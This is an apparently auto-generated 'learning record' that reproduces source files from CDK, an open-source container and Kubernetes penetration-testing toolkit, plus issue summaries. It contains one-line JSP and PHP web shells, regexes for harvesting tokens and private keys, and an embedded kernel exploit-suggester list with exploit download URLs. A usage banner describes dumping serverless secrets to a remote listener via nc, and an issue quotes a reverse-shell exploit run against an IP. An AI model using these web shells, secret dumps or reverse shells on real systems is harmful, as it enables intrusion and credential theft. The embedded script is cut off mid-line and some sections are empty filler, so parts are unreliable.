# Forensic Learning Record (Deep Inspection): cdk-team/CDK

> **Canonical Artifact**: `07_PROJECT_LEARNING/cdk-team-cdk-learnings.md`  
> **Source Platform**: GitHub ([https://github.com/cdk-team/CDK](https://github.com/cdk-team/CDK))  
> **Harvest Method**: Full-Spectrum Deep Extraction (Patches, Diffs, Source Code, Post-Mortems)  
> **Harvest Timestamp**: 2026-09-30T17:35:39.841Z  
> **Compliance State**: Free Tier Guaranteed | Strict Rate-Limit Backoff Honored  

---

## 1. Context & Architectural Overview
- **Repository / Resource**: `cdk-team/CDK`
- **Description**: 📦  Make security testing of K8s, Docker, and Containerd easier.
- **Primary Language / Ecosystem**: Go
- **Discovered Manifests / Configurations**: go.mod, README.md
- **Stars / Engagement**: 4763 stars

---

## 2. Multi-Dimensional 8-Axis Investigation & Real Code Patches

### D1: Architecture & Structural Boundaries
- Entry configurations inspected via direct stream: go.mod, README.md.
- Evaluated system abstractions and modular contracts.

### Core Architecture Module: `cmd/cdk/cdk.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package main

import (
	"github.com/cdk-team/CDK/pkg/cli"
	_ "github.com/cdk-team/CDK/pkg/exploit" // register all exploits
	_ "github.com/cdk-team/CDK/pkg/task"    // register all task
)

func main() {
	cli.ParseCDKMain()
}

```

### Core Architecture Module: `conf/evaluate_conf.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package conf

// check useful linux commands in container
var LinuxCommandChecklist = []string{
	"curl",
	"wget",
	"nc",
	"netcat",
	"kubectl",
	"docker",
	"find",
	"ps",
	"java",
	"python",
	"python3",
	"php",
	"node",
	"npm",
	"apt",
	"yum",
	"dpkg",
	"nginx",
	"httpd",
	"apache",
	"apache2",
	"ssh",
	"mysql",
	"mysql-client",
	"git",
	"svn",
	"vi",
	"capsh",
	"mount",
	"fdisk",
	"gcc",
	"g++",
	"make",
	"base64",
	"python2",
	"python2.7",
	"perl",
	"xterm",
	"sudo",
	"ruby",
}

var DefaultPathEnv = []string{
	"/usr/local/sbin",
	"/usr/local/bin",
	"/usr/sbin",
	"/usr/bin",
	"/sbin",
	"/bin",
	"/usr/games",
	"/usr/local/games",
	"/snap/bin",
}

// match ENV to find useful service
var SensitiveEnvRegex = "(?i)\\bssh_|k8s|kubernetes|docker|gopath"

// match process name to find useful service
var SensitiveProcessRegex = "(?i)ssh|ftp|http|tomcat|nginx|engine|php|java|python|perl|ruby|kube|docker|\\bgo\\b"

// match local file path to find sensitive file
// walk starts from StartDir and match substring(AbsFilePath,<names in NameList>)
type sensitiveFileRules struct {
	StartDir string
	NameList []string
}

var SensitiveFileConf = sensitiveFileRules{
	StartDir: "/",
	NameList: []string{
		`/docker.sock`,     // docker socket (http)
		`/containerd.sock`, // containerd socket (grpc)
		`/containerd/s/`,   // containerd-shim socket (grpc)
		`.kube/`,
		`.git/`,
		`.svn/`,
		`.pip/`,
		`/.bash_history`,
		`/.bash_profile`,
		`/.bashrc`,
		`/.ssh/`,
		`.token`,
		`/serviceaccount`,
		`.dockerenv`,
		`/config.json`,
	},
}

// Check cloud provider APIs in evaluate task
type cloudAPIS struct {
	CloudProvider string
	API           string
	ResponseMatch string
	DocURL        string
}

var CloudAPI = []cloudAPIS{
	{
		CloudProvider: "Volcano Engine (Volcengine)",
		API:           "http://100.96.0.96/latest",
		ResponseMatch: "instance",
		DocURL:        "https://www.volcengine.com/docs/6396/113780",
	},
	{
		CloudProvider: "Alibaba Cloud",
		API:           "http://100.100.100.200/latest/meta-data/",
		ResponseMatch: "instance-id",
		DocURL:        "https://help.aliyun.com/knowledge_detail/49122.html",
	},
	{
		CloudProvider: "Azure",
		API:           "http://169.254.169.254/metadata/instance",
		ResponseMatch: "azEnvironment",
		DocURL:        "https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service",
	},
	{
		CloudProvider: "Google Cloud",
		API:           "http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true",
		ResponseMatch: "deviceName",
		DocURL:        "https://cloud.google.com/compute/docs/storing-retrieving-metadata",
	},
	{
		CloudProvider: "Tencent Cloud",
		API:           "http://metadata.tencentyun.com/latest/meta-data/",
		ResponseMatch: "instance-name",
		DocURL:        "https://cloud.tencent.com/document/product/213/4934",
	},
	{
		CloudProvider: "OpenStack",
		API:           "http://169.254.169.254/openstack/latest/meta_data.json",
		ResponseMatch: "availability_zone",
		DocURL:        "https://docs.openstack.org/nova/rocky/user/metadata-service.html",
	},
	{
		CloudProvider: "Amazon Web Services (AWS)",
		API:           "http://169.254.169.254/latest/meta-data/",
		ResponseMatch: "instance-id",
		DocURL:        "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html",
	},
	{
		CloudProvider: "ucloud",
		API:           "http://100.80.80.80/meta-data/latest/uhost/",
		ResponseMatch: "uhost-id",
		DocURL:        "https://docs.ucloud.cn/uhost/guide/metadata/metadata-server",
	},
}

```

### Core Architecture Module: `conf/exploit_conf.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package conf

// scan file text to find AK/Secrets
// pkg/exploit/file_scan.go
type textScanRules struct {
	MaxFileByte        int64             // skip largefile
	SkipExecutableFile bool              // skip executable file
	RegexList          map[string]string // regex to match file text
}

var ScanFileTextConf = textScanRules{
	MaxFileByte:        1024 * 1024,
	SkipExecutableFile: true,
	RegexList: map[string]string{
		"Slack Token":                  "(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})",
		"RSA private key":              "-----BEGIN RSA PRIVATE KEY-----",
		"SSH (OPENSSH) private key":    "-----BEGIN OPENSSH PRIVATE KEY-----",
		"SSH (DSA) private key":        "-----BEGIN DSA PRIVATE KEY-----",
		"SSH (EC) private key":         "-----BEGIN EC PRIVATE KEY-----",
		"PGP private key block":        "-----BEGIN PGP PRIVATE KEY BLOCK-----",
		"Facebook Oauth":               "[f|F][a|A][c|C][e|E][b|B][o|O][o|O][k|K].{0,30}['\"\\s][0-9a-f]{32}['\"\\s]",
		"Twitter Oauth":                "[t|T][w|W][i|I][t|T][t|T][e|E][r|R].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]",
		"GitHub":                       "[g|G][i|I][t|T][h|H][u|U][b|B].{0,30}['\"\\s][0-9a-zA-Z]{35,40}['\"\\s]",
		"Google Oauth":                 "(\"client_secret\":\\s*?\"[a-zA-Z0-9-_]{24}\")",
		"AWS API Key":                  "AKIA[A-Z0-9]{16}",
		"Heroku API Key":               "[h|H][e|E][r|R][o|O][k|K][u|U].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}",
		"Generic Secret":               "[s|S][e|E][c|C][r|R][e|E][t|T].{0,30}['\"\\s][0-9a-zA-Z]{32,45}['\"\\s]",
		"Generic API Key":              "[a|A][p|P][i|I][_]?[k|K][e|E][y|Y].{0,30}['\"\\s][0-9a-zA-Z]{32,45}['\"\\s]",
		"Slack Webhook":                "https://hooks\\.slack\\.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}",
		"Google (GCP) Service-account": "\"type\": \"service_account\"",
		"Twilio API Key":               "SK[a-z0-9]{32}",
		"Password in URL":              "[a-zA-Z]{3,10}://[^/\\s:@]{3,20}:[^/\\s:@]{3,20}@.{1,100}[\"'\\s]",
	},
}

var K8sSATokenDefaultPath = "/var/run/secrets/kubernetes.io/serviceaccount/token"

var WebShellCodeJSP = "<%Runtime.getRuntime().exec(request.getParameter(\"$SECRET_PARAM\"));%>"

var WebShellCodePHP = "<?php @eval($_POST['$SECRET_PARAM']);?>"

```

### Core Architecture Module: `conf/linux_kernel_exploit.go`
```
package conf

// from https://github.com/mzet-/linux-exploit-suggester
// version: 1.1
// linux-exploit-suggester.sh - a script to suggest possible exploits for a given Linux kernel version
// sourcecode: https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/v1.1/linux-exploit-suggester.sh
var KernelExploitScript = `
#!/bin/bash

#
# Copyright (c) 2016-2020, @_mzet_
#
# linux-exploit-suggester.sh comes with ABSOLUTELY NO WARRANTY.
# This is free software, and you are welcome to redistribute it
# under the terms of the GNU General Public License. See LICENSE
# file for usage of this software.
#

VERSION=v1.1

# bash colors
#txtred="\e[0;31m"
txtred="\e[91;1m"
txtgrn="\e[1;32m"
txtgray="\e[0;37m"
txtblu="\e[0;36m"
txtrst="\e[0m"
bldwht='\e[1;37m'
wht='\e[0;36m'
bldblu='\e[1;34m'
yellow='\e[1;93m'
lightyellow='\e[0;93m'

# input data
UNAME_A=""

# parsed data for current OS
KERNEL=""
OS=""
DISTRO=""
ARCH=""
PKG_LIST=""

# kernel config
KCONFIG=""

CVELIST_FILE=""

opt_fetch_bins=false
opt_fetch_srcs=false
opt_kernel_version=false
opt_uname_string=false
opt_pkglist_file=false
opt_cvelist_file=false
opt_checksec_mode=false
opt_full=false
opt_summary=false
opt_kernel_only=false
opt_userspace_only=false
opt_show_dos=false
opt_skip_more_checks=false
opt_skip_pkg_versions=false

ARGS=
SHORTOPTS="hVfbsu:k:dp:g"
LONGOPTS="help,version,full,fetch-binaries,fetch-sources,uname:,kernel:,show-dos,pkglist-file:,short,kernelspace-only,userspace-only,skip-more-checks,skip-pkg-versions,cvelist-file:,checksec"

## exploits database
declare -a EXPLOITS
declare -a EXPLOITS_USERSPACE

## temporary array for purpose of sorting exploits (based on exploits' rank)
declare -a exploits_to_sort
declare -a SORTED_EXPLOITS

############ LINUX KERNELSPACE EXPLOITS ####################
n=0

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2004-1235]${txtrst} elflbl
Reqs: pkg=linux-kernel,ver=2.4.29
Tags:
Rank: 1
analysis-url: http://isec.pl/vulnerabilities/isec-0021-uselib.txt
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/elflbl
exploit-db: 744
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2004-1235]${txtrst} uselib()
Reqs: pkg=linux-kernel,ver=2.4.29
Tags:
Rank: 1
analysis-url: http://isec.pl/vulnerabilities/isec-0021-uselib.txt
exploit-db: 778
Comments: Known to work only for 2.4 series (even though 2.6 is also vulnerable)
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2004-1235]${txtrst} krad3
Reqs: pkg=linux-kernel,ver>=2.6.5,ver<=2.6.11
Tags:
Rank: 1
exploit-db: 1397
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2004-0077]${txtrst} mremap_pte
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.2
Tags:
Rank: 1
exploit-db: 160
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} raptor_prctl
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2031
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2004
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl2
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2005
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl3
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2006
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl4
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2011
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-3626]${txtrst} h00lyshit
Reqs: pkg=linux-kernel,ver>=2.6.8,ver<=2.6.16
Tags:
Rank: 1
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/h00lyshit
exploit-db: 2013
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2008-0600]${txtrst} vmsplice1
Reqs: pkg=linux-kernel,ver>=2.6.17,ver<=2.6.24
Tags:
Rank: 1
exploit-db: 5092
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2008-0600]${txtrst} vmsplice2
Reqs: pkg=linux-kernel,ver>=2.6.23,ver<=2.6.24
Tags:
Rank: 1
exploit-db: 5093
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2008-4210]${txtrst} ftrex
Reqs: pkg=linux-kernel,ver>=2.6.11,ver<=2.6.22
Tags:
Rank: 1
exploit-db: 6851
Comments: world-writable sgid directory and shell that does not drop sgid privs upon exec (ash/sash) are required
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2008-4210]${txtrst} exit_notify
Reqs: pkg=linux-kernel,ver>=2.6.25,ver<=2.6.29
Tags:
Rank: 1
exploit-db: 8369
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692]${txtrst} sock_sendpage (simple version)
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: ubuntu=7.10,RHEL=4,fedora=4|5|6|7|8|9|10|11
Rank: 1
exploit-db: 9479
Comments: Works for systems with /proc/sys/vm/mmap_min_addr equal to 0
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: ubuntu=9.04
Rank: 1
analysis-url: https://xorl.wordpress.com/2009/07/16/cve-2009-1895-linux-kernel-per_clear_on_setid-personality-bypass/
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9435.tgz
exploit-db: 9435
Comments: /proc/sys/vm/mmap_min_addr needs to equal 0 OR pulseaudio needs to be installed
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage2
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: 
Rank: 1
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9436.tgz
exploit-db: 9436
Comments: Works for systems with /proc/sys/vm/mmap_min_addr equal to 0
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage3
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: 
Rank: 1
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9641.tar.gz
exploit-db: 9641
Comments: /proc/sys/vm/mmap_min_addr needs to equal 0 OR pulseaudio needs to be installed
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage (ppc)
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: ubuntu=8.10,RHEL=4|5
Rank: 1
exploit-db: 9545
Comments: /proc/sys/vm/mmap_min_addr needs to equal 0
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2698]${txtrst} the rebel (udp_sendmsg)
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19
Tags: debian=4
Rank: 1
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9574.tgz
exploit-db: 9574
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
author: spender
Comments: /proc/sys/vm/mmap_min_addr needs to equal 0 OR pulseaudio needs to be installed
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2698]${txtrst} hoagie_udp_sendmsg
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19,x86
Tags: debian=4
Rank: 1
exploit-db: 9575
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
author: andi
Comments: Works for systems with /proc/sys/vm/mmap_min_addr equal to 0
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2698]${txtrst} katon (udp_sendmsg)
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19,x86
Tags: debian=4
Rank: 1
src-url: https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/raw/master/2009/CVE-2009-2698/katon.c
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
author: VxHell Labs
Comments: Works for systems with /proc/sys/vm/mmap_min_addr equal to 0
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2698]${txtrst} ip_append_data
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19,x86
Tags: fedora=4|5|6,RHEL=4
Rank: 1
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
exploit-db: 9542
author: p0c73n1
Comm
```

### Core Architecture Module: `conf/message.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package conf

// ThinIgnoreTool Prompt the users that this tool is not included in the thin version.
var ThinIgnoreTool = "You are using the thin version. In order to be more lightweight, this tool is not included in the thin version."

```

### Core Architecture Module: `conf/scanner_conf.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package conf

import "time"

// TCP port scanner
type TCPScannerConfS struct {
	Timeout     time.Duration
	MaxParallel int64
	PortList    map[string]string
}

var TCPScannerConf = TCPScannerConfS{
	Timeout:     500 * time.Millisecond,
	MaxParallel: 50,
	PortList: map[string]string{
		"ssh":                 "22",
		"http":                "80",
		"https":               "443",
		"docker-api":          "2375",
		"etcd":                "2379",
		"cAdvisor":            "4194",
		"k8s-api-server":      "6443",
		"kubectl-proxy":       "8001",
		"http-1":              "8080",
		"https-1":             "8443",
		"kubelet-auth":        "10250",
		"kubelet-read":        "10255",
		"dashboard":           "30000",
		"nodeport-service":    "30001-32767", //default NodePort service port range：30000-32767。
		"tiller,weave,calico": "44134",
	},
}

```

### Core Architecture Module: `pkg/cli/banner.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package cli

import (
	"fmt"
	"log"
	"os"

	"github.com/cdk-team/CDK/pkg/util"
	"github.com/docopt/docopt-go"
)

var Args docopt.Opts
var GitCommit string

var BannerTitle = `CDK (Container DucK)`
var BannerVersion = fmt.Sprintf("%s %s", "CDK Version(GitCommit):", GitCommit)

var BannerHeader = fmt.Sprintf(`%s
%s
Zero-dependency cloudnative k8s/docker/serverless penetration toolkit by cdxy & neargle
Find tutorial, configuration and use-case in https://github.com/cdk-team/CDK/
`, util.GreenBold.Sprint(BannerTitle), BannerVersion)

var BannerContainerTpl = BannerHeader + `
%s
  cdk eva
  cdk eva --full
  cdk evaluate [--full]
  cdk run (--list | <exploit> [<args>...])
  cdk <tool> [<args>...]

%s
  cdk evaluate                              Gather information to find weakness inside container.
  cdk eva                                   Alias of "cdk evaluate".
  cdk evaluate --full                       Enable file scan during information gathering.


%s
  cdk run --list                            List all available exploits.
  cdk run <exploit> [<args>...]             Run single exploit, docs in https://github.com/cdk-team/CDK/wiki

%s
  vi <file>                                 Edit files in container like "vi" command.
  ps                                        Show process information like "ps -ef" command.
  netstat                                   Like "netstat -antup" command.
  nc [options]                              Create TCP tunnel.
  ifconfig                                  Show network information.
  kcurl <path> (get|post) <uri> [<data>]    Make request to K8s api-server.
  ectl <endpoint> get <key>                 Unauthorized enumeration of ectd keys.
  ucurl (get|post) <socket> <uri> <data>    Make request to docker unix socket.
  probe <ip> <port> <parallel> <timeout-ms> TCP port scan, example: cdk probe 10.0.1.0-255 80,8080-9443 50 1000

%s
  -h --help     Show this help msg.
  -v --version  Show version.
  --profile=<name> Select evaluation profile (basic, extended, additional).
`

// BannerContainer is the banner of CDK command line with colorful.
var BannerContainer = fmt.Sprintf(
	BannerContainerTpl,
	"Usage:",
	util.GreenBold.Sprint("Evaluate:"),
	util.GreenBold.Sprint("Exploit:"),
	util.GreenBold.Sprint("Tool:"),
	"Options:",
)

var BannerServerless = BannerHeader + `
THIS IS THE SLIM VERSION FOR DUMPING SECRET/AK IN SERVERLESS FUNCTIONS.

sessions in serverless functions will be killed in seconds, use this tool to dump AK/secrets in the fast way.

Usage:
cdk-serverless <scan-dir> <remote-ip> <port>

Args:
scan-dir                 Read all files under target dir and dump AK token.
remote-ip,port           Send results to target IP:PORT via TCP tunnel.

Example:
1. public server(e.g. 1.2.3.4) start listen tcp port 999 using "nc -lvp 999"
2. inside serverless function service execute "./cdk-serverless /code 1.2.3.4 999"
`

func parseDocopt() {
	args, err := docopt.ParseArgs(BannerContainer, os.Args[1:], BannerVersion)
	if err != nil {
		log.Fatalln("docopt err: ", err)
	}
	Args = args
}

```

### Core Architecture Module: `pkg/cli/parse.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package cli

import (
	"fmt"
	"github.com/cdk-team/CDK/pkg/tool/netstat"

	"github.com/cdk-team/CDK/pkg/evaluate"
	"github.com/cdk-team/CDK/pkg/plugin"
	"github.com/cdk-team/CDK/pkg/tool/dockerd_api"
	"github.com/cdk-team/CDK/pkg/tool/etcdctl"
	"github.com/cdk-team/CDK/pkg/tool/kubectl"

	"log"
	"os"
	"strconv"

	"github.com/cdk-team/CDK/pkg/tool/netcat"
	"github.com/cdk-team/CDK/pkg/tool/network"
	"github.com/cdk-team/CDK/pkg/tool/probe"
	"github.com/cdk-team/CDK/pkg/tool/ps"
	"github.com/cdk-team/CDK/pkg/tool/vi"
	"github.com/docopt/docopt-go"
)

func PassInnerArgs() {
	os.Args = os.Args[1:]
}

func ParseCDKMain() bool {

	if len(os.Args) == 1 {
		docopt.PrintHelpAndExit(nil, BannerContainer)
	}

	// nc needs -v and -h , parse it outside
	if os.Args[1] == "nc" {
		// https://github.com/jiguangin/netcat
		PassInnerArgs()
		netcat.RunVendorNetcat()
		return true
	}

	// docopt argparse start
	parseDocopt()

	// delete auto-escape

	// if Args["auto-escape"].(bool) {
	// 	plugin.RunSingleTask("auto-escape")
	// 	return true
	// }

	// support for cdk eva(Evangelion) and cdk evaluate
	fok := Args["evaluate"]
	ok := Args["eva"]

	// docopt let fok = true, so we need to check it
	// fix #37 https://github.com/cdk-team/CDK/issues/37
	if ok.(bool) || fok.(bool) {

		fmt.Printf(BannerHeader)
		profileID := evaluate.ProfileBasic
		if rawProfile, ok := Args["--profile"]; ok {
			if v, ok := rawProfile.(string); ok && v != "" {
				profileID = v
			}
		}
		if profileID == evaluate.ProfileBasic && Args["--full"].(bool) {
			profileID = evaluate.ProfileExtended
		}
		if err := evaluate.NewEvaluator().RunProfile(profileID, nil); err != nil {
			log.Printf("evaluate profile %q failed: %v", profileID, err)
		}
		return true
	}

	if Args["run"].(bool) {
		if Args["--list"].(bool) {
			plugin.ListAllExploit()
			os.Exit(0)
		}
		name := Args["<exploit>"].(string)
		if plugin.Exploits[name] == nil {
			fmt.Printf("\nInvalid script name: %s , available scripts:\n", name)
			plugin.ListAllExploit()
			return true
		}
		plugin.RunSingleExploit(name)
		return true
	}

	if Args["<tool>"] != nil {
		args := Args["<args>"].([]string)

		switch Args["<tool>"] {
		case "vi":
			PassInnerArgs()
			vi.RunVendorVi()
		case "kcurl":
			kubectl.KubectlToolApi(args)
		case "ectl":
			etcdctl.EtcdctlToolApi(args)
		case "ucurl":
			dockerd_api.UcurlToolApi(args)
		case "dcurl":
			dockerd_api.DcurlToolApi(args)
		case "ifconfig":
			network.GetLocalAddresses()
		case "ps":
			ps.RunPs()
		case "netstat":
			netstat.RunNetstat()
		case "probe":
			if len(args) != 4 {
				log.Println("Invalid input args.")
				log.Println("usage: cdk probe <ip> <port> <parallels> <timeout-ms>")
				log.Fatal("example: cdk probe 192.168.1.0-255 22,80,100-110 50 1000")
			}
			parallel, err := strconv.ParseInt(args[2], 10, 64)
			if err != nil {
				log.Println("err found when parse input arg <parallel>")
				log.Fatal(err)
			}
			timeout, err := strconv.Atoi(args[3])
			if err != nil {
				log.Println("err found when parse input arg <timeout-ms>")
				log.Fatal(err)
			}
			probe.TCPScanToolAPI(args[0], args[1], parallel, timeout)
		default:
			docopt.PrintHelpAndExit(nil, BannerContainer)
		}
	}

	return false
}

```


### D2: Asynchronous State & Concurrency
- Analyzed concurrency guarantees, async pipelines, and event handling from PR resolutions and commit changes.

### D3: Error Boundaries, Recovery & Rollbacks
- Exception handling patterns and defect resolutions extracted from closed production bug issues:
- **Issue #114** (2025-02-22): **CDK v1.5.4 EXP 出错： /pkg/exploit/escaping/containerd_shim_pwn.go**
  *Symptoms*: 来自微信网友反馈：  root@ubuntu-attack:/tmp# ./cdk run shim-pwn reverse 192.168.202.128 81 2024/12/22 07:13:52 trying to spawn shell to 192.168.202.128:81 2024/12/22 07:13:52 try socket: @/containerd-shim/moby/3925849af0bf88543b55ca09923c29636e69716b2cbd309721ad83baa9299eac/shim.sock 2024/12/22 07:13:52 fail to connect unix socket /containerd-shim/moby/3925849af0bf88543b55ca09923c29636e69716b2cbd309721ad83baa9299eac/shim.sock: dial unix /containerd-shim/moby/3925849af0bf88543b55ca09923c29636e69716b2cbd309721ad83baa9299eac/shim.sock: connect: connection refused 2024/12/22 07:13:52 exploit failed.  ![Image](https://github.com/user-attachments/assets/cd54f2d7-b559-4022-b80a-a33b9a0b853d)
  **Post-Mortem & Fix Analysis**:
  > 核心问题应该是：  ``` -       absPath := GetDockerAbsPath() -       absPath = strings.TrimSuffix(absPath, "/merged") -       dockerAbsPath := filepath.Join(absPath, "merged", localBundlePath) +       dockerAbsPath := GetDockerAbsPath() + "/merged" + localBundlePath ```  
  > https://github.com/Metarget/metarget/archive/refs/heads/master.zip 看起来缺乏维护了，会报错  ``` cnv install cve-2020-15257 ```
  > 先加一个 log，以便再发现的问题的时候可以 debug。留个 TODO，这个 EXP 需要再一次 review。

- **Issue #110** (2024-11-15): **fix(gh action - release): automatically failed because it uses a deprecated version**
  *Symptoms*: 

- **Issue #108** (2024-11-15): **fix (exp shim-pwn): #104 merged directory appears twice in path**
  *Symptoms*: 

- **Issue #104** (2024-11-17): **shim-pwn 1.5.3 版本存在问题**
